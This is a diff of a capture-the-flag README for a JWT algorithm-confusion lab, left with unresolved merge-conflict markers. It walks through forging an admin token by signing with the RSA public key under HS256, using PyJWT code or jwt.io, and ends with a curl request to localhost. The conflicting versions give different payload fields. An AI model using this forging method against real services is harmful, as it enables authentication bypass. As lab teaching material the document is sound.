@@ -5,9 +5,15 @@ This challenge demonstrates a classic JWT algorithm confusion vulnerability wher
 
 ## Files Provided
 - `app.py`: The vulnerable Flask web application
+<<<<<<< HEAD
 - `public.pem`: RSA public key (distributed to players)
 - `private.pem`: RSA private key (included for completeness, normally kept secret)
 - `flag.txt`: The flag to be captured
+=======
+- `public.pem`: RSA public key (**distribute to players** - needed for verification and as HS256 secret)
+- `private.pem`: RSA private key (**keep secret on server only** - used to sign legitimate tokens, NOT distributed to players)
+- `flag.txt`: The flag to be captured (place on server, not distributed)
+>>>>>>> f496a21 (soap3)
 - `requirements.txt`: Python dependencies
 - `Dockerfile`: Optional containerization
 
@@ -45,7 +51,13 @@ Decode the JWT (base64url) to see header and payload:
 - Payload: `{"username":"user","exp":1719456000,...}`
 
 ### Step 3: Forge an admin token
+<<<<<<< HEAD
 Using Python with PyJWT:
+=======
+You can forge the token either with Python (if you have the environment) or directly via the jwt.io website.
+
+#### Option A: Using Python with PyJWT
+>>>>>>> f496a21 (soap3)
 ```python
 import jwt
 
@@ -61,6 +73,10 @@ decoded = jwt.decode(original_token, options={"verify_signature": False})
 
 # Modify payload to impersonate admin
 decoded['username'] = 'admin'
+<<<<<<< HEAD
+=======
+decoded['role'] = 'admin'   # ensure role is admin
+>>>>>>> f496a21 (soap3)
 
 # Create forged token with HS256 algorithm and public key as secret
 forged_token = jwt.encode(decoded, public_key, algorithm='HS256')
@@ -68,6 +84,26 @@ forged_token = jwt.encode(decoded, public_key, algorithm='HS256')
 print("Forged token:", forged_token)
 ```
 
+<<<<<<< HEAD
+=======
+#### Option B: Using jwt.io website
+1. Go to https://jwt.io
+2. Set **Algorithm** to `HS256`
+3. Paste the entire contents of `public.pem` into the **Secret** field (include the `-----BEGIN PUBLIC KEY-----` and `-----END PUBLIC KEY-----` lines)
+4. In the **Encoded** section, replace the payload with:
+   ```json
+   {
+     "sub": "admin",
+     "role": "admin",
+     "exp": <expiry from original token or a future timestamp>
+   }
+   ```
+   You can get the expiry by decoding the original token (without verification) – just copy the `exp` value.
+5. The **Signature** box will automatically generate a forged token.
+6. Copy the token from the **Encoded** section.
+
+
+>>>>>>> f496a21 (soap3)
 ### Step 4: Use the forged token to get the flag
 ```bash
 curl -H "Authorization: Bearer $FORGED_TOKEN" http://localhost:5000/profile
